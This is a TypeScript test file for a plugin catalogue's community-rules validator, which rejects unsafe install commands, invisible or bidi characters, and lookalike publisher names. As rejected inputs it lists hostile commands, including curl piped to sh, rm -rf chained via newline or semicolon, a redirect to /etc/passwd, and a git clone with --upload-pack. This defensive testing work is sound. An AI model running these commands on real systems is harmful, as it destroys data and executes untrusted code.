import { describe, expect, it } from "vitest";
import { communityMod } from "@/lib/__fixtures__/community";
import {
  COMMUNITY_LIMITS,
  MAX_COMMAND_LENGTH,
  commandProblem,
  communityRuleProblems,
  describeText,
  foldForComparison,
  futureCheckedAtProblem,
  githubOwnerAndRepo,
  invisibleCharacterProblems,
  levenshteinDistance,
  lookalikeSlugProblems,
  todayIso,
} from "@/lib/community-rules";
import { extensionSchema, type Extension } from "@/lib/types";

// Built from code points so this file never contains an invisible character itself.
const character = (codePoint: number): string => String.fromCodePoint(codePoint);
const NEWLINE = character(0x0a);
const CARRIAGE_RETURN = character(0x0d);
const TAB = character(0x09);
const NUL = character(0x00);
const RIGHT_TO_LEFT_OVERRIDE = character(0x202e);
const LEFT_TO_RIGHT_ISOLATE = character(0x2066);
const ZERO_WIDTH_SPACE = character(0x200b);
const ZERO_WIDTH_JOINER = character(0x200d);
const BYTE_ORDER_MARK = character(0xfeff);
const SOFT_HYPHEN = character(0x00ad);
const E_ACUTE = character(0x00e9);
const ELLIPSIS = character(0x2026);
const CYRILLIC_A = character(0x0430);
const GREEK_UPSILON = character(0x03c5);
const FULLWIDTH_CAPITAL_A = character(0xff21);

const context = { owner: "tidy-labs", repo: "tidy-hooks", hasOwnClone: false } as const;

function problemsFor(overrides: Partial<Extension>, existingSlugs: readonly string[] = []): readonly string[] {
  return communityRuleProblems({ ...communityMod, ...overrides }, "tidy-hooks.json", { existingSlugs });
}

function expectProblem(problems: readonly string[], fragment: string | RegExp): void {
  const isMatch = problems.some((problem) =>
    typeof fragment === "string" ? problem.includes(fragment) : fragment.test(problem),
  );
  expect(isMatch, `expected a problem matching ${String(fragment)} in:\n${problems.join("\n")}`).toBe(true);
}

describe("a compliant community mod", () => {
  it("passes the schema and every community rule", () => {
    expect(extensionSchema.safeParse(communityMod).success).toBe(true);
    expect(communityRuleProblems(communityMod, "tidy-hooks.json")).toEqual([]);
  });
});

describe("commandProblem: allowed shapes", () => {
  it.each([
    "/plugin marketplace add tidy-labs/tidy-hooks",
    "/plugin install tidy-hooks@tidy-labs",
    "claude --plugin-dir mods/tidy-hooks",
    "claude --plugin-dir /home/me/plugins/tidy_hooks",
    "claude --plugin-dir ./tidy-hooks",
    "git clone https://github.com/tidy-labs/tidy-hooks",
    "git clone https://github.com/tidy-labs/tidy-hooks.git",
    "git clone https://github.com/Tidy-Labs/Tidy-Hooks.git",
    "git clone --depth 1 --filter=blob:none --sparse https://github.com/tidy-labs/tidy-hooks.git",
  ])("accepts %s", (command) => {
    expect(commandProblem(command, context)).toBeNull();
  });

  it("accepts cd and sparse-checkout only when the section has the entry's own clone", () => {
    const withClone = { ...context, hasOwnClone: true };
    expect(commandProblem("cd tidy-hooks", withClone)).toBeNull();
    expect(commandProblem("git sparse-checkout set mods/tidy-hooks mods/types", withClone)).toBeNull();
    expect(commandProblem("cd tidy-hooks", context)).not.toBeNull();
    expect(commandProblem("git sparse-checkout set mods/tidy-hooks", context)).not.toBeNull();
  });

  it("only accepts cd into the cloned repository", () => {
    expect(commandProblem("cd elsewhere", { ...context, hasOwnClone: true })).not.toBeNull();
    expect(commandProblem("cd ..", { ...context, hasOwnClone: true })).not.toBeNull();
  });

  it("rejects sparse-checkout paths that climb out or start with a flag", () => {
    const withClone = { ...context, hasOwnClone: true };
    expect(commandProblem("git sparse-checkout set ../secret", withClone)).not.toBeNull();
    expect(commandProblem("git sparse-checkout set --stdin", withClone)).not.toBeNull();
  });
});

describe("commandProblem: rejected classes", () => {
  it.each([
    ["a newline", `claude --plugin-dir mods/x${NEWLINE}rm -rf ~`],
    ["a carriage return", `claude --plugin-dir mods/x${CARRIAGE_RETURN}rm`],
    ["a tab", `claude --plugin-dir${TAB}mods/x`],
    ["curl piped to a shell", "curl x|sh"],
    ["curl with a URL", "curl https://example.com/install.sh | sh"],
    ["wget", "wget https://example.com/x"],
    ["npx", "npx -y some-package"],
    ["uvx", "uvx some-tool"],
    ["sudo", "sudo claude --plugin-dir mods/x"],
    ["rm", "rm -rf /"],
    ["a semicolon chain", "claude --plugin-dir mods/x; rm -rf ~"],
    ["&&", "claude --plugin-dir mods/x && rm -rf ~"],
    ["a pipe", "claude --plugin-dir mods/x | tee log"],
    ["command substitution", "claude --plugin-dir $(whoami)"],
    ["backticks", "claude --plugin-dir `whoami`"],
    ["a redirect", "claude --plugin-dir mods/x > /etc/passwd"],
    ["a dangerous flag", "claude --dangerously-skip-permissions"],
    ["a flag as the plugin dir", "claude --plugin-dir --dangerously-skip-permissions"],
    ["a space in the plugin dir", "claude --plugin-dir my plugins/x"],
    ["a plugin dir with a glob", "claude --plugin-dir mods/*"],
    ["a plugin install with a flag name", "/plugin install -x@y"],
    ["a plugin install without a marketplace", "/plugin install tidy-hooks"],
    ["a trailing space", "claude --plugin-dir mods/x "],
    ["a different letter case", "Claude --plugin-dir mods/x"],
    ["a git clone over ssh", "git clone git@github.com:tidy-labs/tidy-hooks.git"],
    ["a git clone from another host", "git clone https://gitlab.com/tidy-labs/tidy-hooks"],
    ["a git clone with an unknown flag", "git clone --upload-pack=evil https://github.com/tidy-labs/tidy-hooks"],
    ["a git clone with extra arguments", "git clone https://github.com/tidy-labs/tidy-hooks /etc"],
    ["an empty command", ""],
  ])("rejects %s", (_label, command) => {
    expect(commandProblem(command, { ...context, hasOwnClone: true })).not.toBeNull();
  });

  it("rejects a git clone of someone else's repository, by owner or by repo", () => {
    expect(commandProblem("git clone https://github.com/other/tidy-hooks", context)).toMatch(/own repository/);
    expect(commandProblem("git clone https://github.com/tidy-labs/other", context)).toMatch(/own repository/);
  });

  it("rejects non-ASCII and bidi text, multi-line text and commands over the length limit", () => {
    expect(commandProblem(`claude --plugin-dir mods/caf${E_ACUTE}`, context)).toMatch(/ASCII/);
    expect(commandProblem(`claude --plugin-dir mods/x${RIGHT_TO_LEFT_OVERRIDE}`, context)).toMatch(/ASCII/);
    expect(commandProblem(`claude --plugin-dir ${"a".repeat(MAX_COMMAND_LENGTH)}`, context)).toMatch(/at most 200/);
    expect(commandProblem(`claude --plugin-dir mods/x${NEWLINE}y`, context)).toMatch(/single line/);
  });
});

describe("communityRuleProblems: copy-to-run fields", () => {
  it("checks installCommands and names the field path and the offending text", () => {
    const problems = problemsFor({ availability: "installable", installCommands: ["npx -y evil-package"] });
    expectProblem(problems, /^installCommands\.0: "npx -y evil-package" is not an allowed command shape/);
  });

  it("checks details values only when isCommand is true", () => {
    const risky = { label: "Run", value: "curl x|sh", isCommand: true };
    expectProblem(problemsFor({ details: [risky] }), /^details\.0\.value: "curl x\|sh"/);
    expect(problemsFor({ details: [{ ...risky, isCommand: false }] })).toEqual([]);
  });

  it("checks guide commands and names the section and command index", () => {
    const guide = [
      ...communityMod.guide,
      { title: "Extra", paragraphs: ["Text."], commands: ["claude --plugin-dir mods/x", "wget https://example.com/x"] },
    ];
    expectProblem(problemsFor({ guide }), /^guide\.3\.commands\.1: "wget https:\/\/example\.com\/x"/);
  });

  it("does not allow cd or sparse-checkout in a section without the entry's own clone", () => {
    const guide = communityMod.guide.map((section) =>
      section.title.startsWith("Download") ? { ...section, commands: ["cd tidy-hooks"] } : section,
    );
    expectProblem(problemsFor({ guide }), /^guide\.2\.commands\.0: "cd tidy-hooks"/);
  });

  it("escapes control characters and truncates the offending text to 60 characters", () => {
    const long = `claude --plugin-dir mods/${"x".repeat(80)};${RIGHT_TO_LEFT_OVERRIDE}`;
    const [problem] = problemsFor({ details: [{ label: "Run", value: long, isCommand: true }] }).filter((line) =>
      line.startsWith("details.0.value"),
    );
    expect(problem).toContain("...");
    expect(problem).not.toContain(RIGHT_TO_LEFT_OVERRIDE);
    expect(problem.length).toBeLessThan(200);
    expect(describeText(`a${NEWLINE}b${RIGHT_TO_LEFT_OVERRIDE}c`)).toBe('"a\\nb\\u{202e}c"');
    expect(describeText("x".repeat(61))).toBe(`"${"x".repeat(60)}..."`);
    expect(describeText("x".repeat(60))).toBe(`"${"x".repeat(60)}"`);
  });
});

describe("communityRuleProblems: text hygiene", () => {
  it.each([
    ["a newline", `line one${NEWLINE}line two`],
    ["a tab", `a${TAB}b`],
    ["a right-to-left override", `safe${RIGHT_TO_LEFT_OVERRIDE}txt`],
    ["a bidi isolate", `a${LEFT_TO_RIGHT_ISOLATE}b`],
    ["a zero-width space", `zero${ZERO_WIDTH_SPACE}width`],
    ["a zero-width joiner", `a${ZERO_WIDTH_JOINER}b`],
    ["a byte order mark", `${BYTE_ORDER_MARK}start`],
    ["a soft hyphen", `soft${SOFT_HYPHEN}hyphen`],
    ["a NUL", `a${NUL}b`],
  ])("rejects %s in a guide paragraph and names the field", (_label, text) => {
    const guide = communityMod.guide.map((section, index) =>
      index === 0 ? { ...section, paragraphs: [text] } : section,
    );
    expectProblem(problemsFor({ guide }), /^guide\.0\.paragraphs\.0: contains a control, bidi or zero-width character/);
  });

  it("walks every string value, including tags, hooks and names", () => {
    expectProblem(problemsFor({ tags: ["ok", `bad${ZERO_WIDTH_SPACE}tag`] }), /^tags\.1:/);
    expectProblem(problemsFor({ hooks: [`tool${RIGHT_TO_LEFT_OVERRIDE}.call`] }), /^hooks\.0:/);
    expectProblem(problemsFor({ name: `na${ZERO_WIDTH_SPACE}me` }), /^name:/);
  });

  it("accepts ordinary non-ASCII letters and punctuation in prose", () => {
    expect(problemsFor({ summary: `Formats caf${E_ACUTE} files ${ELLIPSIS} quickly.` })).toEqual([]);
  });

  it("invisibleCharacterProblems reports nothing for clean nested values", () => {
    expect(invisibleCharacterProblems({ a: ["x", { b: "y" }], c: 3, d: null })).toEqual([]);
    expect(invisibleCharacterProblems({ a: ["x", { b: `y${ZERO_WIDTH_SPACE}` }] })).toHaveLength(1);
  });
});

describe("communityRuleProblems: length limits", () => {
  const limits = COMMUNITY_LIMITS;
  const cases: readonly (readonly [string, Partial<Extension>, RegExp])[] = [
    ["name", { name: "n".repeat(limits.nameLength + 1) }, /^name:/],
    ["summary", { summary: "s".repeat(limits.summaryLength + 1) }, /^summary:/],
    ["a description paragraph", { description: ["d".repeat(limits.paragraphLength + 1)] }, /^description\.0:/],
    ["a tag", { tags: ["t".repeat(limits.tagLength + 1)] }, /^tags\.0:/],
    [
      "the tag count",
      { tags: Array.from({ length: limits.tags + 1 }, (_, index) => `tag${index}`) },
      /^tags: has 13 items/,
    ],
    ["a hook", { hooks: ["h".repeat(limits.hookLength + 1)] }, /^hooks\.0:/],
    [
      "the hook count",
      { hooks: Array.from({ length: limits.hooks + 1 }, (_, index) => `event.${index}`) },
      /^hooks: has 41 items/,
    ],
    [
      "a detail label",
      { details: [{ label: "l".repeat(limits.detailLabelLength + 1), value: "v", isCommand: false }] },
      /^details\.0\.label:/,
    ],
    [
      "a detail value",
      { details: [{ label: "l", value: "v".repeat(limits.detailValueLength + 1), isCommand: false }] },
      /^details\.0\.value:/,
    ],
    [
      "the link count",
      {
        links: Array.from({ length: limits.links + 1 }, (_, index) => ({
          label: `L${index}`,
          url: "https://github.com/tidy-labs/tidy-hooks",
        })),
      },
      /^links: has 11 items/,
    ],
  ];

  it.each(cases)("rejects a long %s", (_label, overrides, pattern) => {
    expectProblem(problemsFor(overrides), pattern);
  });

  it("rejects a long guide paragraph and title and too many guide sections", () => {
    const [first, ...rest] = communityMod.guide;
    const guide = [
      { ...first, title: "t".repeat(limits.guideTitleLength + 1), paragraphs: ["p".repeat(limits.paragraphLength + 1)] },
      ...rest,
    ];
    const problems = problemsFor({ guide });
    expectProblem(problems, /^guide\.0\.title:/);
    expectProblem(problems, /^guide\.0\.paragraphs\.0:/);
    const many = Array.from({ length: limits.guideSections + 1 }, (_, index) => ({
      title: `Set up download ${index}`,
      paragraphs: ["x"],
      commands: [],
    }));
    expectProblem(problemsFor({ guide: many }), /^guide: has 13 items/);
  });

  it("accepts values exactly at the limits", () => {
    expect(
      problemsFor({
        name: "n".repeat(limits.nameLength),
        tags: Array.from({ length: limits.tags }, (_, index) => `${"t".repeat(limits.tagLength - 2)}${String(index).padStart(2, "0")}`),
        description: ["d".repeat(limits.paragraphLength)],
      }),
    ).toEqual([]);
  });
});

describe("communityRuleProblems: identity", () => {
  it("requires a publisher URL", () => {
    expectProblem(problemsFor({ publisher: { ...communityMod.publisher, url: null } }), /^publisher\.url: is required/);
  });

  it("requires the publisher URL owner to equal the repository owner, ignoring case", () => {
    expectProblem(
      problemsFor({ publisher: { ...communityMod.publisher, url: "https://github.com/someone-else" } }),
      /^publisher\.url: owner "someone-else" must equal/,
    );
    expect(problemsFor({ publisher: { ...communityMod.publisher, url: "https://github.com/Tidy-Labs" } })).toEqual([]);
  });

  it("requires the publisher URL to be on github.com", () => {
    expectProblem(
      problemsFor({ publisher: { ...communityMod.publisher, url: "https://code.claude.com/docs" } }),
      /^publisher\.url: must be on github\.com/,
    );
  });

  it("requires the verification source owner to equal the repository owner", () => {
    expectProblem(
      problemsFor({
        verification: { ...communityMod.verification, sourceUrl: "https://github.com/someone-else/tidy-hooks" },
      }),
      /^verification\.sourceUrl: owner "someone-else" must equal/,
    );
  });

  it.each(["anthropics", "anthropic", "modelcontextprotocol", "claude-ai", "claude", "Anthropics", "ModelContextProtocol"])(
    "rejects the reserved repository owner %s",
    (owner) => {
      const problems = problemsFor({
        repositoryUrl: `https://github.com/${owner}/tidy-hooks`,
        publisher: { ...communityMod.publisher, url: `https://github.com/${owner}` },
        verification: { ...communityMod.verification, sourceUrl: `https://github.com/${owner}/tidy-hooks` },
      });
      expectProblem(problems, /^repositoryUrl: the owner ".*" is reserved/);
    },
  );

  it.each([
    ["the plain word", "Anthropic Tools"],
    ["upper case", "CLAUDE Labs"],
    ["a full-width spelling", `${FULLWIDTH_CAPITAL_A}nthropic Helpers`],
    ["a Cyrillic homoglyph", `${CYRILLIC_A}nthropic Helpers`],
    ["Cyrillic and Greek letters in claude", `Cl${CYRILLIC_A}${GREEK_UPSILON}de Team`],
    ["official", "Official Plugins"],
    ["unofficial", "Unofficial Tools"],
    ["mcp", "Fast mcp Works"],
  ])("rejects a publisher name with %s", (_label, name) => {
    expectProblem(
      problemsFor({ publisher: { ...communityMod.publisher, name } }),
      /^publisher\.name: .* contains the reserved word/,
    );
  });

  it("accepts an ordinary publisher name", () => {
    expect(problemsFor({ publisher: { ...communityMod.publisher, name: "Tidy Labs" } })).toEqual([]);
  });

  it("folds text for comparison", () => {
    expect(foldForComparison(`${FULLWIDTH_CAPITAL_A}nthropic`)).toBe("anthropic");
    expect(foldForComparison(`${CYRILLIC_A}nthropic`)).toBe("anthropic");
  });

  it("rejects a slug within edit distance 2 of another slug and names both", () => {
    const problems = problemsFor({}, ["tidy-hookz", "unrelated-thing"]);
    expectProblem(problems, 'slug: "tidy-hooks" is within edit distance 2 of the existing slug "tidy-hookz"');
    expect(problems.some((problem) => problem.includes("unrelated-thing"))).toBe(false);
  });

  it("does not compare short slugs or the same slug, and allows distance 3", () => {
    expect(lookalikeSlugProblems("abcde", ["abcdf"])).toEqual([]);
    expect(lookalikeSlugProblems("tidy-hooks", ["tidy-hooks"])).toEqual([]);
    expect(lookalikeSlugProblems("tidy-hooks", ["tidy-hxxks"])).toHaveLength(1);
    expect(lookalikeSlugProblems("tidy-hooks", ["tidy-hxxxs"])).toEqual([]);
  });

  it("computes edit distance", () => {
    expect(levenshteinDistance("kitten", "sitting")).toBe(3);
    expect(levenshteinDistance("", "abc")).toBe(3);
    expect(levenshteinDistance("same", "same")).toBe(0);
  });
});

describe("communityRuleProblems: original rules", () => {
  it("reports each broken rule with its own message, without pinning a count", () => {
    const broken: Partial<Extension> = {
      isFeatured: true,
      stars: { count: 1, capturedAt: "2026-09-20" },
      availability: "built-in",
    };
    const problems = communityRuleProblems({ ...communityMod, ...broken }, "wrong.json");
    expectProblem(problems, 'file name must be "tidy-hooks.json"');
    expectProblem(problems, "isFeatured must be false");
    expectProblem(problems, "stars must be null");
    expectProblem(problems, 'availability must not be "built-in"');
  });

  it("rejects a publisher kind other than community", () => {
    expectProblem(
      problemsFor({ publisher: { ...communityMod.publisher, kind: "anthropic" } }),
      'publisher.kind must be "community"',
    );
  });

  it("rejects a repository that is not on github.com", () => {
    expectProblem(
      problemsFor({ repositoryUrl: "https://code.claude.com/docs/en/plugins" }),
      "repositoryUrl must be on github.com",
    );
  });
});

describe("dates and helpers", () => {
  it("flags a checkedAt later than today and accepts today and earlier", () => {
    expect(futureCheckedAtProblem(communityMod, "2026-09-19")).toMatch(
      /2026-09-20 is later than today \(2026-09-19, UTC\)/,
    );
    expect(futureCheckedAtProblem(communityMod, "2026-09-20")).toBeNull();
    expect(futureCheckedAtProblem(communityMod, "2026-12-31")).toBeNull();
  });

  it("formats today in UTC", () => {
    expect(todayIso(new Date("2026-09-20T23:59:59Z"))).toBe("2026-09-20");
    expect(todayIso()).toMatch(/^\d{4}-\d{2}-\d{2}$/);
  });

  it("parses github owners and repos in lower case and rejects other hosts", () => {
    expect(githubOwnerAndRepo("https://github.com/Owner/Repo.git")).toEqual({ owner: "owner", repo: "repo" });
    expect(githubOwnerAndRepo("https://github.com/owner")).toEqual({ owner: "owner", repo: "" });
    expect(githubOwnerAndRepo("https://gitlab.com/owner/repo")).toBeNull();
    expect(githubOwnerAndRepo("not a url")).toBeNull();
  });
});
